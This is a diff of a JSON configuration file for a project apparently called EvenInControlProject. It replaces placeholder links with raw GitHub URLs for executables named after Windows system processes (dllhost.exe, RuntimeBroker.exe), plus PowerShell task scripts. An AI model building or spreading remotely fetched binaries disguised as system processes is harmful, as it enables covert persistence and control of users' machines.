@@ -1,17 +1,20 @@
 {
   "logLevel": 5,
   "ConfirmationLog": true,
-  "ConfirmationInterval": 480000,
+  "ConfirmationInterval": 300001,
   "UpdateTimerInterval": 60000,
   "dllhostFiles": [
-    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost_test.exe",
-    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost_test.exe.config",
+    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost.exe",
+    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost.exe.config",
+    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/Newtonsoft.Json.dll",
     "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/tskdllhost.ps1"
   ],
   "runtimebrokerFiles": [
-    "link1",
-    "link2"
+    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/RuntimeBroker.exe",
+    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/RuntimeBroker.exe.config",
+    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/Newtonsoft.Json.dll",
+    "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/tskRuntimeBroker.ps1"
   ],
-  "dllhostConfig": "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost_test.exe.config",
-  "runtimebrokerConfig": "link"
+  "dllhostConfig": "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/dllhost.exe.config",
+  "runtimebrokerConfig": "https://raw.githubusercontent.com/andre370/EvenInControlProject/main/RuntimeBroker.exe.config"
 }
